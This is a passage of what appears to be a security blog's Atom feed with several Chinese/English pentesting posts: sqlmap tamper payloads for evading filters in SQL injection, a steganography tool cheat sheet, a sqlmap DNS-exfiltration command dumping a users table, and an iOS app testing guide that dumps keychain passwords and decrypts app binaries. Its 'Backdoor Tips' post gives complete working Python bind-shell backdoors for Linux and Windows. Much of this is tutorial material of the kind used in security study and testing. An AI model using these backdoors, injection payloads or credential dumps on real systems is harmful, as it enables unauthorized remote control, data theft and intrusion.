+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 UNION ALL SELECT ==&gt; -1 UNION SELECT</span><br></pre></td></tr></table></figure>
+<h3 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h3><p><strong>Function: ‘ ==&gt; %df%27</strong></p>
+<p><strong>Platform: Mysql magic_quotes/addslashes</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; AND 1=1 ==&gt; 1%bf%27--</span><br></pre></td></tr></table></figure>
+<h3 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h3><p><strong>Function: 小写转大写</strong></p>
+<p><strong>Platform: Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert ==&gt; INSERT</span><br></pre></td></tr></table></figure>
+<h3 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h3><p><strong>Function: header头</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-originating-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<h3 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h3><p><strong>Function: union ==&gt; /<em>!union</em>/</strong></p>
+<p><strong>Platform: MySQL 4.0.18, 5.1.56, 5.5.11</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user() ==&gt; 1/*!UNION*//*!SELECT*/user()</span><br></pre></td></tr></table></figure>
+<h3 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h3><p><strong>Function: union ==&gt; /<em>!union</em>/</strong></p>
+<p><strong>Platform: MySQL 5.1.56, 5.5.11</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select user() ==&gt; 1/*!UNION*//*!SELECT*/user()</span><br></pre></td></tr></table></figure>
+<h3 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h3><p><strong>Function: X-Forwarded-For随机头</strong></p>
+<p><strong>Platform: All</strong></p>
+<blockquote>
+<p>example</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;apostrophemask-py&quot;&gt;&lt;a href=&quot;#apostrophemask-py&quot; class=&quot;headerlink&quot; title=&quot;apostrophemask.py&quot;&gt;&lt;/a&gt;apostrophemask.py&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Fu
+    
+    </summary>
+    
+    
+      <category term="sqlmap" scheme="http://blog.safebuff.com/tags/sqlmap/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Steganography</title>
+    <link href="http://blog.safebuff.com/2016/09/03/Steganography/"/>
+    <id>http://blog.safebuff.com/2016/09/03/Steganography/</id>
+    <published>2016-09-03T14:27:07.000Z</published>
+    <updated>2016-09-05T17:44:29.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; copy /b 1.jpg+1.rar new.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk zip.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a><a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="external">Stegsolve</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stegsolve.jar</span><br></pre></td></tr></table></figure>
+<h3 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; exiftool 1.jpg</span><br></pre></td></tr></table></figure>
+<h3 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a><a href="http://www.petitcolas.net/fabien/software/MP3Stego_1_1_18.zip" target="_blank" rel="external">MP3Stego</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line">&gt; decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure>
+<h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk carter.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">382           0x17E           Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</span><br><span class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</span><br><span class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; dd if=test.jpg of=test.jpg skip=140147 bs=1</span><br></pre></td></tr></table></figure>
+<h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; foremost</span><br></pre></td></tr></table></figure>
+<h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><blockquote>
+<p>mp4</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg 1.mp4</span><br></pre></td></tr></table></figure>
+<h3 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; pngcheck -vv 1.png</span><br></pre></td></tr></table></figure>
+<h3 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h3><blockquote>
+<p>python来写zlib解压,zlib开头是以78 9C开头</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">import zlib</span><br><span class="line">import binascii</span><br><span class="line">IDAT = &quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;.decode(&apos;hex&apos;)</span><br><span class="line">#print IDAT</span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line">print result</span><br><span class="line"> </span><br><span class="line">#print result.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;copy&quot;&gt;&lt;a href=&quot;#copy&quot; class=&quot;headerlink&quot; title=&quot;copy&quot;&gt;&lt;/a&gt;copy&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
+    
+    </summary>
+    
+    
+      <category term="Steganography" scheme="http://blog.safebuff.com/tags/Steganography/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Backdoor Tips</title>
+    <link href="http://blog.safebuff.com/2016/08/24/Backdoor-Tips/"/>
+    <id>http://blog.safebuff.com/2016/08/24/Backdoor-Tips/</id>
+    <published>2016-08-24T06:46:29.000Z</published>
+    <updated>2016-08-24T11:31:50.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="正向backdoor"><a href="#正向backdoor" class="headerlink" title="正向backdoor"></a>正向backdoor</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
+<p>backdoor.py</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print &apos;waiting for connect&apos;</span><br><span class="line">    talk, addr = server.accept()</span><br><span class="line">    print &apos;connect from&apos;,addr</span><br><span class="line">    proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;],stdin=talk,stdout=talk,stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
+<h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><blockquote>
+<p>backdoor.py</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading</span><br><span class="line"></span><br><span class="line">def send(talk, proc):</span><br><span class="line">    import time</span><br><span class="line">    while True:</span><br><span class="line">        msg = proc.stdout.readline()</span><br><span class="line">        talk.send(msg)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">    server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">    server.listen(5)</span><br><span class="line">    print &apos;waiting for connect&apos;</span><br><span class="line">    talk, addr = server.accept()</span><br><span class="line">    print &apos;connect from&apos;,addr</span><br><span class="line">    proc = subprocess.Popen(&apos;cmd.exe /K&apos;,stdin=subprocess.PIPE,stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)</span><br><span class="line">    t = threading.Thread(target = send, args = (talk, proc))</span><br><span class="line">    t.setDaemon(True)</span><br><span class="line">    t.start()</span><br><span class="line">    while True:</span><br><span class="line">        cmd=talk.recv(1024)</span><br><span class="line">        proc.stdin.write(cmd)</span><br><span class="line">        proc.stdin.flush()</span><br><span class="line">    server.close()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;正向backdoor&quot;&gt;&lt;a href=&quot;#正向backdoor&quot; class=&quot;headerlink&quot; title=&quot;正向backdoor&quot;&gt;&lt;/a&gt;正向backdoor&lt;/h3&gt;&lt;h4 id=&quot;Linux&quot;&gt;&lt;a href=&quot;#Linux&quot; class=&quot;he
+    
+    </summary>
+    
+    
+      <category term="Backdoor" scheme="http://blog.safebuff.com/tags/Backdoor/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Bypass header function</title>
+    <link href="http://blog.safebuff.com/2016/08/23/Bypass-header-function/"/>
+    <id>http://blog.safebuff.com/2016/08/23/Bypass-header-function/</id>
+    <published>2016-08-23T04:29:06.000Z</published>
+    <updated>2016-08-23T04:52:28.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-Code"><a href="#0x01-Code" class="headerlink" title="0x01 Code"></a>0x01 Code</h3><blockquote>
+<p><a href="http://www.bypassheader.com/index.php" target="_blank" rel="external">http://www.bypassheader.com/index.php</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    if($_SESSION(&apos;bypass&apos;))&#123;</span><br><span class="line">        echo &apos;ok&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        header(&apos;Location: http://www.baidu.com/&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;bypass header&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-firefox-NoRedirect-plugins"><a href="#0x02-firefox-NoRedirect-plugins" class="headerlink" title="0x02 firefox NoRedirect plugins"></a>0x02 firefox NoRedirect plugins</h3><p>Install <a href="https://addons.mozilla.org/zh-CN/firefox/addon/noredirect/" target="_blank" rel="external">NoRedirect</a> plugins</p>
+<blockquote>
+<p>usage</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>regex</th>
+<th>referer</th>
+<th>allow</th>
+<th>DNS Error</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>^<a href="http://www\.bypassheader\.com" target="_blank" rel="external">http://www\.bypassheader\.com</a></td>
+<td>√</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-Code&quot;&gt;&lt;a href=&quot;#0x01-Code&quot; class=&quot;headerlink&quot; title=&quot;0x01 Code&quot;&gt;&lt;/a&gt;0x01 Code&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.bypasshea
+    
+    </summary>
+    
+    
+      <category term="Bypass" scheme="http://blog.safebuff.com/tags/Bypass/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQLMAP Dns Injection</title>
+    <link href="http://blog.safebuff.com/2016/08/09/SQLMAP-Dns-Injection/"/>
+    <id>http://blog.safebuff.com/2016/08/09/SQLMAP-Dns-Injection/</id>
+    <published>2016-08-09T05:42:50.000Z</published>
+    <updated>2016-08-23T14:47:36.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>0x01 Environment<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wampserver  ==&gt; Virtual host-&gt;waf.com</span><br><span class="line">sqlmap      ==&gt; sqlmap on win2003</span><br><span class="line">win2003     ==&gt; dns -&gt; 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p>0x02 Hack fun it<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sqlmap.py -u &quot;http://www.example.com/index.php?id=1&quot; --dns-domain=&quot;waf.com&quot; -D &quot;dvwa&quot; -T &quot;users&quot; --dump</span><br></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;0x01 Environment&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;
+    
+    </summary>
+    
+    
+      <category term="sqlmap &amp;&amp; dns injection" scheme="http://blog.safebuff.com/tags/sqlmap-dns-injection/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Pentesting ios apps</title>
+    <link href="http://blog.safebuff.com/2016/07/18/Pentesting-ios-apps/"/>
+    <id>http://blog.safebuff.com/2016/07/18/Pentesting-ios-apps/</id>
+    <published>2016-07-18T13:46:39.000Z</published>
+    <updated>2016-10-25T08:52:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">openssh</span><br><span class="line">gdb</span><br><span class="line">hexdump</span><br><span class="line">strings</span><br><span class="line">otool</span><br><span class="line">plutil</span><br><span class="line">FileDP</span><br><span class="line">dumpdecrypted</span><br><span class="line">class-dump</span><br><span class="line">class-dump-z</span><br><span class="line">Keychain-Dumper</span><br><span class="line">cycript</span><br><span class="line">BurpSuite</span><br><span class="line">sslstrip</span><br><span class="line">Introspy-Analyzer</span><br><span class="line">ios-ssl-kill-switch</span><br><span class="line">iFunbox</span><br><span class="line">reveal</span><br><span class="line">Clutch</span><br><span class="line">iRET</span><br><span class="line">idb</span><br></pre></td></tr></table></figure>
+<h3 id="plutil"><a href="#plutil" class="headerlink" title="plutil"></a>plutil</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; plutil -convert xml1 com.example.plist</span><br></pre></td></tr></table></figure>
+<h3 id="FileDP"><a href="#FileDP" class="headerlink" title="FileDP"></a>FileDP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; chmod 777 FileDP</span><br><span class="line">&gt; ./FileDP -d /var/mobile/Applications/&lt;UUID&gt;/Library/Preferences/</span><br><span class="line">&gt; ./FileDP -f /var/mobile/Applications/&lt;UUID&gt;/Library/Preferences/xxx.plist</span><br></pre></td></tr></table></figure>
+<h3 id="class-dump"><a href="#class-dump" class="headerlink" title="class-dump"></a><a href="https://github.com/nygard/class-dump/releases" target="_blank" rel="external">class-dump</a></h3><h3 id="class-dump-z"><a href="#class-dump-z" class="headerlink" title="class-dump-z"></a><a href="http://networkpx.googlecode.com/files/class-dump-z_0.2a.tar.gz" target="_blank" rel="external">class-dump-z</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; class-dump-z /private/var/mobile/Applications/&lt;UUID&gt;/xxx.app</span><br></pre></td></tr></table></figure>
+<h3 id="cycript"><a href="#cycript" class="headerlink" title="cycript"></a><a href="http://www.cycript.org/debs/" target="_blank" rel="external">cycript</a></h3><h3 id="Keychain-Dumper"><a href="#Keychain-Dumper" class="headerlink" title="Keychain-Dumper"></a><a href="https://github.com/ptoomey3/Keychain-Dumper" target="_blank" rel="external">Keychain-Dumper</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; keychain-dumper -e &gt; /var/tmp/entitlements.xml</span><br><span class="line">&gt; keychain-dumper -a &gt; /var/tmp/password.txt</span><br></pre></td></tr></table></figure>
+<h3 id="dumpdecrypted"><a href="#dumpdecrypted" class="headerlink" title="dumpdecrypted"></a><a href="http://git.oschina.net/hongyangyi/dumpdecrypted" target="_blank" rel="external">dumpdecrypted</a></h3><blockquote>
+<p>dumpdecrypted 6/7/8</p>
+</blockquote>
+<p>去掉arm64</p>
+<blockquote>
+<p>把/var/mobile/Applications/<uuid>/TargetApp.app/XXXTargetApp 复制到mac上</uuid></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; lipo xxx -remove arm64 -output xxx.remove</span><br></pre></td></tr></table></figure>
+<p>砸壳<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; cp dumpdecrypted.dylib /var/mobile/Applications/&lt;UUID&gt;/TargetApp.app/Document</span><br><span class="line"></span><br><span class="line">&gt; cd /var/mobile/Applications/&lt;UUID&gt;/Document</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>输入命令行，回车砸壳完毕</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/XXXXXX/TargetApp.app/XXXTargetApp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>显示</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[+] detected 32bit ARM binary in memory.</span><br><span class="line">[+] offset to cryptid found: @0x81a78(from 0x81000) = a78</span><br><span class="line">[+] Found encrypted data at address 00004000 of length 6569984 bytes - type 1.</span><br><span class="line">[+] Opening /private/var/mobile/Containers/Bundle/Application/03B61840-2349-4559-B28E-0E2C6541F879/TargetApp.app/TargetApp for reading.</span><br><span class="line">[+] Reading header</span><br><span class="line">[+] Detecting header type[+] Executable is a plain MACH-O image</span><br><span class="line">[+] Opening TargetApp.decrypted for writing.</span><br><span class="line">[+] Copying the not encrypted start of the file</span><br><span class="line">[+] Dumping the decrypted data into the file</span><br><span class="line">[+] Copying the not encrypted remainder of the file</span><br><span class="line">[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a78</span><br><span class="line">[+] Closing original file[+] Closing dump file</span><br></pre></td></tr></table></figure>
+<h3 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a><a href="https://portswigger.net" target="_blank" rel="external">BurpSuite</a></h3><h3 id="Introspy-Analyzer"><a href="#Introspy-Analyzer" class="headerlink" title="Introspy-Analyzer"></a><a href="https://github.com/iSECPartners/Introspy-Analyzer" target="_blank" rel="external">Introspy-Analyzer</a></h3><p>Introspy-IOS have a error from github <a href="https://isecpartners.github.io/Introspy-iOS/" target="_blank" rel="external">download</a> install have a error，example：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">iPhone:~ root# dpkg -i com.isecpartners.introspy-v0.4-iOS_7.deb</span><br><span class="line">(Reading database ... 1695 files and directories currently installed.)</span><br><span class="line">Preparing to replace com.isecpartners.introspy 0.4.0-31 (using com.isecpartners.introspy-v0.4-iOS_7.deb) ...</span><br><span class="line">Unpacking replacement com.isecpartners.introspy ...</span><br><span class="line">dpkg: dependency problems prevent configuration of com.isecpartners.introspy:</span><br><span class="line"> com.isecpartners.introspy depends on preferenceloader; however:</span><br><span class="line">  Package preferenceloader is not installed.</span><br><span class="line"> com.isecpartners.introspy depends on applist; however:</span><br><span class="line">  Package applist is not installed.</span><br><span class="line">dpkg: error processing com.isecpartners.introspy (--install):</span><br><span class="line"> dependency problems - leaving unconfigured</span><br><span class="line">Errors were encountered while processing:</span><br><span class="line"> com.isecpartners.introspy</span><br></pre></td></tr></table></figure></p>
+<p>fix the bug<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cydia search preferenceloader reinstall</span><br></pre></td></tr></table></figure></p>
+<p>Install introspy-analyzer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; pip install git+https://github.com/iSECPartners/Introspy-Analyzer.git</span><br><span class="line">&gt; python -m introspy -p ios -o output -f 192.168.1.12</span><br><span class="line">&gt; python -m introspy -p ios -l introspy.db</span><br><span class="line">&gt; python -m introspy -p ios -i urls introspy.db</span><br></pre></td></tr></table></figure></p>
+<h3 id="ios-ssl-kill-switch"><a href="#ios-ssl-kill-switch" class="headerlink" title="ios-ssl-kill-switch"></a><a href="https://github.com/iSECPartners/ios-ssl-kill-switch" target="_blank" rel="external">ios-ssl-kill-switch</a></h3><h3 id="iFunbox"><a href="#iFunbox" class="headerlink" title="iFunbox"></a><a href="http://www.i-funbox.com/" target="_blank" rel="external">iFunbox</a></h3><h3 id="reveal"><a href="#reveal" class="headerlink" title="reveal"></a><a href="https://revealapp.com/" target="_blank" rel="external">reveal</a></h3><h3 id="Clutch"><a href="#Clutch" class="headerlink" title="Clutch"></a><a href="https://github.com/KJCracks/Clutch/releases" target="_blank" rel="external">Clutch</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iPhone:~ root# chmod +x Clutch</span><br><span class="line">iPhone:~ root# mv /var/root/Clutch /usr/bin/</span><br><span class="line">iPhone:~ root# Clutch</span><br><span class="line"></span><br><span class="line">Usage: Clutch [OPTIONS]</span><br><span class="line">-b --binary-dump &lt;value&gt; Only dump binary files from specified bundleID</span><br><span class="line">-d --dump &lt;value&gt;        Dump specified bundleID into .ipa file</span><br><span class="line">-i --print-installed     Print installed applications</span><br><span class="line">   --clean               Clean /var/tmp/clutch directory</span><br><span class="line">   --version             Display version and exit</span><br><span class="line">-? --help                Display this help and exit</span><br><span class="line">-n --no-color            Print with colors disabled</span><br></pre></td></tr></table></figure>
+<h3 id="iRET-ios6-x-or-ios7-x"><a href="#iRET-ios6-x-or-ios7-x" class="headerlink" title="iRET(ios6.x or ios7.x)"></a>iRET(ios6.x or ios7.x)</h3><h4 id="iRET"><a href="#iRET" class="headerlink" title="iRET"></a><a href="https://github.com/S3Jensen/iRET" target="_blank" rel="external">iRET</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; dpkg -i iRET.deb</span><br></pre></td></tr></table></figure>
+<p>browser open website http://<ip>:5555</ip></p>
+<p>####perl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget http://coredev.nl/cydia/coredev.pub</span><br><span class="line">&gt; apt-key add coredev.pub</span><br><span class="line">&gt; echo &apos;deb http://coredev.nl/cydia iphone main&apos; &gt; /etc/apt/sources.list.d/coredev.nl.list</span><br><span class="line">&gt; apt-get update</span><br><span class="line">&gt; apt-get install perl</span><br></pre></td></tr></table></figure></p>
